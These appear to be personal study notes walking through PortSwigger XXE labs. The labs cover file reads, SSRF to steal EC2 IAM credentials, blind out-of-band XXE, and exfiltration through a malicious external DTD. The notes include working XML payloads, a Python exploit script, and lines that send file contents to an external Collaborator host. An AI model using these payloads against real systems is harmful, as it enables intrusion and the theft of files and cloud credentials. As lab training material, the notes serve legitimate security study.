## **1. Exploiting XXE using external entities to retrieve files**
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
    `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
3. Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the contents of the `/etc/passwd` file.

step1:
![[Pasted image 20240925193628.png]]

step2:
![[Pasted image 20240925193654.png]]

step3:
![[Pasted image 20240925193806.png]]

- discovering where we can inject an XML entity and test for it :
![[Pasted image 20240925194015.png]]
- reference the entity as an internal one to prove the concept
	![[Pasted image 20240925194111.png]]

- proceed further using an external XML entity to abuse the system & reveal info
		![[Pasted image 20240925194143.png]]

## **2. Exploiting XXE to perform SSRF attacks**
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive. 
To solve the lab, exploit the [XXE](https://portswigger.net/web-security/xxe) vulnerability to perform an [SSRF attack](https://portswigger.net/web-security/ssrf) that obtains the server's IAM secret access key from the EC2 metadata endpoint.

1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
    `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`
3. Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
4. Iteratively update the URL in the DTD to explore the API until you reach `/latest/meta-data/iam/security-credentials/admin`. This should return JSON containing the `SecretAccessKey`.

Analysis:

- following xml error we will append directories in our server request 
http://169.254.169.254/
http://169.254.169.254/latest
http://169.254.169.254/latest/meta-data
http://169.254.169.254/latest/meta-data/iam
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin

```
?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY nbyte SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
	<productId>
		&nbyte;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

```
?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY paein SYSTEM "http://169.254.169.254/latest.../.../admin"> ]>
<stockCheck>
	<productId>
		&paein;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

![[Pasted image 20240926201314.png]]

- Python script
```
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_xxe(s, url):

    print("(+) Exploiting XXE Injection...")
    stock_url = url + "/product/stock"
    data_stock = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
    r = s.post(stock_url, data=data_stock, verify=False, proxies=proxies)
    print("(+) The following is the content of the secret file: ")
    print(r.text)

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    exploit_xxe(s, url)
```

## **3. Blind XXE with out-of-band interaction**
This lab has a "Check stock" feature that parses XML input but does not display the result.
You can detect the [blind XXE](https://portswigger.net/web-security/xxe/blind) vulnerability by triggering out-of-band interactions with an external domain.
To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

1. Visit a product page, click "Check stock" and intercept the resulting POST request in [Burp Suite Professional](https://portswigger.net/burp/pro).
2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
    `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
3. Replace the `productId` number with a reference to the external entity:
    `&xxe;`
4. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

Analysis:

- testing for XXE vulnerability (using internal XXE)
![[Pasted image 20240927012427.png]]

- we will try an external XXE (same response)
![[Pasted image 20240927012657.png]]

- we observe that we are in a blind XXE injection case (out of band) so we will use an external server in order to obtain a DNS lookup (we have to use burp collaborator)
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY nbyte SYSTEM "http://Burp-Collaborator-SubDomain">]>
<stockCheck>
	<productId>
		&nbyte;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

![[Pasted image 20240927013218.png]]

## **4. Blind XXE with out-of-band interaction via XML parameter entities**
This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

1. Visit a product page, click "Check stock" and intercept the resulting POST request in [Burp Suite Professional](https://portswigger.net/burp/pro).
2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
    `<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`
3. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

Analysis:

- we proceed with same steps as above but this time we encounter a different error which is telling us that the parser is doing it s job
![[Pasted image 20240927014600.png]]
![[Pasted image 20240927014716.png]]

- we will declare and reference our entity inside of the doctype 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % nbyte SYSTEM "http://Burp-Collaborator-SubDomain"> %nbyte; ]>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

![[Pasted image 20240927015321.png]]

- we will proceed with a DNS lookup using burp collaborator server as in above example since we are now in a out of band XXE injection.

## **5. Exploiting blind XXE to exfiltrate data using a malicious external DTD**
This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Place the Burp Collaborator payload into a malicious DTD file:
    `<!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %eval; %exfil;`
4. Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
5. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
6. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
    `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
7. Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
8. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the `/etc/hostname` file.

Analysis:
